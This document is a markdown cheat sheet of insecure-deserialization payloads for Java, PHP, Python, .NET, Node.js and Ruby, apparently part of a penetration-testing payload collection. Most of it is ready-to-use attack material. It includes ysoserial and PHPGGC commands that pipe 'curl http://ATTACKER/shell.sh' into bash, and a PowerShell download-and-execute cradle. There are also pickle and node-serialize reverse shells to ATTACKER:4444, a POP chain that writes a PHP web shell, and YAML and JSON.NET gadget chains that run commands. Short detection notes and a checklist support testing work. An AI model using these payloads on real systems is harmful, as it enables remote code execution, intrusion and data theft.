# 🔓 Deserialization Payloads

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Java Deserialization

### Detection
```
# Magic bytes
AC ED 00 05    # Java serialized object (Base64: rO0AB)
H4sIAAAA       # GZip compressed

# Common locations
- Cookies (Base64 encoded)
- Hidden form fields
- ViewState
- API parameters
- RMI (port 1099)
- JMX (port 9010)
```

### ysoserial - Payload Generator
```bash
# Install
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Generate payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Common gadget chains
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### DNS Exfiltration Payload
```bash
# Generate DNS callback payload
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# DNS-based detection
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Common Vulnerable Libraries
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 PHP Deserialization

### Magic Methods
```php
__construct()    // Object creation
__destruct()     // Object destruction
__wakeup()       // Unserialization
__sleep()        // Serialization
__toString()     // Object to string
__call()         // Inaccessible method
__get()          // Inaccessible property read
__set()          // Inaccessible property write
```

### Basic Payload
```php
// Serialized object format
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Object with properties
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Array
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Type Juggling
```php
// Boolean true bypass
O:4:"User":1:{s:8:"password";b:1;}

// Integer 0 comparison
O:4:"User":1:{s:8:"password";i:0;}

// Array comparison bypass
O:4:"User":1:{s:8:"password";a:0:{}}
```

### POP Chain Payloads
```php
// Arbitrary file write
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Command execution via __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC - PHP Gadget Chain
```bash
# Install
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List gadgets
./phpggc -l

# Generate payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Base64 encode
./phpggc -b Laravel/RCE1 system "id"

# URL encode
./phpggc -u Laravel/RCE1 system "id"

# With wrapper (PHAR)
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Phar Deserialization
```php
// Phar files can trigger deserialization when accessed
phar://path/to/phar.phar/internal-file

// Access methods that trigger phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Python Deserialization (Pickle)

### Basic Payload
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Reverse Shell Payload
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Detection
```
# Magic bytes
80 04 95    # Protocol 4 (Python 3)
80 03       # Protocol 3
80 02       # Protocol 2

# Common Base64 patterns
gASV        # Protocol 4
gAN         # Protocol 3
```

### YAML Deserialization (Python)
```yaml
# PyYAML unsafe load
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Multiple commands
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 .NET Deserialization

### Detection
```
# ViewState
__VIEWSTATE parameter (Base64)

# BinaryFormatter
AAEAAAD/////    # Base64 magic

# JSON.NET
$type field in JSON
```

### ysoserial.net - Payload Generator
```powershell
# Download
# https://github.com/pwntester/ysoserial.net

# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Common gadgets
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# ViewState exploitation
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Vulnerable code: unserialize(user_input)
// Payload with IIFE (Immediately Invoked Function Expression)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Reverse shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// If eval() is used on deserialized data
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Ruby Deserialization

### Marshal.load
```ruby
# Create payload
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Testing Checklist

```markdown
□ Identify serialization format (Base64, hex, magic bytes)
□ Determine language/framework (Java, PHP, Python, .NET)
□ Find vulnerable library versions
□ Generate payloads with appropriate tool
□ Test blind with DNS/HTTP callbacks
□ Test for file read/write
□ Test for code execution
□ Try different gadget chains
□ Bypass filters (encoding, compression)
```

---

## 🔗 Tools Summary

| Language | Tool | Usage |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Custom | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Custom | Manual payload creation |

---

## 🔗 Related Payloads

- [SSTI Payloads](./SSTI.md)
- [Command Injection](./Command-Injection.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)
